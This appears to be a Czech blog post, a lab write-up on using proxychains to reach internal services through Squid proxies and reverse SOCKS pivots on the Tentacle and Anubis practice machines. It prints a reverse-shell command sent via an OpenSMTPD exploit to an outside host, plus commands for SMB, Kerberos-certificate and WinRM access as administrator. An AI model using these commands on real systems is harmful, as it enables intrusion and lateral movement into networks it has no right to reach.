---
layout: post
author: Tomáš Matějíček
title: "Proxychains"
date: 2020-10-28
tags: nastroje proxy socks tunneling pivot localhost
---
## Úvod a kontext

`proxychains` je v praxi užitečný tehdy, když útok neskončí na tom, že "něco běží interně", ale potřebuje běžný klientský nástroj donutit komunikovat přes mezilehlý proxy nebo SOCKS most. Neřeší zranitelnost. Řeší dosažitelnost cíle.

Na [Tentacle](/tentacle) otevře cestu přes veřejný Squid k internímu WPAD a pak k OpenSMTPD v neveřejném segmentu. Na [Anubisu](/anubis) zase využije reverzní SOCKS přes kompromitovaný host a dovolí pracovat s interním SMB, `curl`, `kinit` i `evil-winrm`, jako by šlo o běžně dosažitelné služby. Širší dopravní logiku rozebírám i v článku [Port forwarding, proxy a protokolové mosty jako exploitační primitivum](/techniky/port-forwarding-proxy-a-protokolove-mosty-jako-exploitacni-primitivum).

## Co `proxychains` v praxi řeší

`proxychains` není skener ani tunelovací server. Je to tenká vrstva, která vezme běžný TCP klientský nástroj a pošle jeho spojení přes definovaný proxy řetězec. Prakticky tedy odpovídá na otázku:

- jak použít obyčejný `curl`, `smbclient`, `kinit` nebo exploit skript proti cíli, který není z lokálního stroje přímo dosažitelný?

Právě to je jeho největší hodnota. V mnoha řetězcích už služba známá je. Problém není "co napadnout", ale "jak se k tomu dostat bez psaní vlastního transportního kódu".

## Nejčastější scénáře využití v tomto projektu

### Práce přes veřejný proxy do interní sítě

Na [Tentacle](/tentacle) byla zvenku dostupná pouze Squid proxy. Samotná hodnota útoku ale ležela až za ní: v interním WPAD a ještě dalším SMTP hostu v neveřejném rozsahu.

```bash
proxychains curl http://wpad.realcorp.htb/wpad.dat
proxychains python3 exploit.py 10.241.251.113 25 'bash -c "exec bash -i &> /dev/tcp/10.10.14.22/4000 <&1"'
```

Tady je důležité, že `proxychains` nepřináší "lepší recon". Překlápí interní endpoint do podoby, se kterou už umí pracovat běžný toolchain:

- `curl` pro stažení `wpad.dat`,
- exploit skript pro OpenSMTPD,
- a případně další nástroje, které jinak čekají normální TCP konektivitu.

### Využití reverzního SOCKS po footholdu

Na [Anubisu](/anubis) se nejprve získal foothold a přes `chisel` vznikl reverzní SOCKS most. Teprve na něj navázal `proxychains`, který dovolil obsluhovat interní služby běžnými klienty:

```bash
proxychains -f proxychains4.conf curl "http://softwareportal.windcorp.htb/install.asp?client=10.10.14.7&software=7z1900-x64.exe"
proxychains -f proxychains4.conf smbclient -L 172.28.224.1 -U localadmin
proxychains -f proxychains4.conf kinit -X X509_user_identity=FILE:kinit/admin.cer,kinit/admin.key Administrator@WINDCORP.HTB
proxychains -f proxychains4.conf evil-winrm -i earth.windcorp.htb -u administrator -r WINDCORP.HTB
```

To je prakticky velmi silný pattern:

- kompromitovaný host otevře transport,
- `proxychains` zpřístupní interní síť běžným nástrojům,
- a další kroky už nevypadají jako exotický pivot, ale jako standardní práce se SMB, Kerberem nebo WinRM.

### Jednotný pracovní způsob napříč nástroji

V projektu je na `proxychains` cenné i to, že nemění samotný pracovní postup. Když už jednou existuje SOCKS nebo HTTP proxy, lze přes něj protáhnout různé druhy klientů bez přepisování každého kroku zvlášť.

To je důležité hlavně ve chvíli, kdy se útok přelévá mezi různými vrstvami:

- z webu na SMB,
- ze SMB na Kerberos,
- z Kerberosu na WinRM,
- nebo z proxy-only přístupu na exploit interní služby.

## Kdy je `proxychains` nejlepší volba

Největší smysl dává tehdy, když:

- už existuje použitelný proxy nebo SOCKS endpoint,
- cíl je interní nebo jinak přímo nedosažitelný,
- a další nástroj očekává obyčejné TCP spojení.

V takové chvíli je praktičtější než složit vlastní tunelovací logiku pro každý jednotlivý nástroj.

## Co `proxychains` neumí vyřešit za vás

`proxychains`:

- sám nepostaví pivot,
- neotevře SOCKS server,
- nefunguje dobře pro všechno, co nepoužívá běžné TCP spojení,
- a neřeší autentizační nebo aplikační logiku cílové služby.

Na [Tentacle](/tentacle) byla pořád potřeba znát interní cíl a mít exploit. Na [Anubisu](/anubis) byl nejdřív nutný foothold a reverzní SOCKS přes `chisel`. `proxychains` řeší až vrstvu "jak tam dostanu svůj klientský provoz".

## Nejčastější chyby při použití

### Záměna za anonymizační nástroj

V tomhle projektu `proxychains` neslouží k anonymizaci. Slouží k dosažitelnosti interních služeb. Pokud se tak nečte, snadno unikne jeho skutečná role v řetězci.

### Použití bez jasné představy o dopravní vrstvě

Nejdřív je potřeba vědět:

- jaký proxy endpoint existuje,
- jaký typ proxy je k dispozici,
- a jaký cíl za ním chci obsloužit.

Bez toho se z `proxychains` stane jen slepé balení příkazů.

### Očekávání, že vyřeší všechny protokoly stejně

Nástroj funguje dobře pro běžné TCP klienty. Jakmile ale daný program používá vlastní síťovou logiku, raw sockety nebo nečekané způsoby resolvu, nemusí být výsledek spolehlivý.

## Nejčastější praktické scénáře

### Mám veřejný proxy a potřebuji přes něj obsloužit interní službu

To je [Tentacle](/tentacle).

### Mám foothold a reverzní SOCKS, ale chci dál používat normální nástroje

To je [Anubis](/anubis).

### Potřebuji zachovat stejný workflow i po přechodu do interní sítě

To je opakující se situace všude tam, kde se po pivotu dál používá `curl`, SMB klienti, Kerberos utility nebo WinRM.

## Související články v projektu

- Rozbory: [Tentacle](/tentacle), [Anubis](/anubis)
- Techniky: [Port forwarding, proxy a protokolové mosty jako exploitační primitivum](/techniky/port-forwarding-proxy-a-protokolove-mosty-jako-exploitacni-primitivum), [Lokálně dostupné služby po footholdu: localhost není boundary](/techniky/lokalne-dostupne-sluzby-po-footholdu-localhost-neni-boundary), [Síťová topologie jako leak: WPAD, Squid, FXP a interní mapování](/techniky/sitova-topologie-jako-leak-wpad-squid-fxp-a-interni-mapovani)

## Co si odnést do praxe

- `proxychains` je nejpraktičtější jako vrstva, která dovolí běžným klientům komunikovat přes už existující proxy nebo SOCKS pivot.
- Největší hodnotu má ve chvíli, kdy už znáte interní cíl a potřebujete ho zpřístupnit standardnímu toolingu.
- Není to náhrada za pivot. Je to prostředek, jak z postaveného mostu udělat použitelnou pracovní cestu.
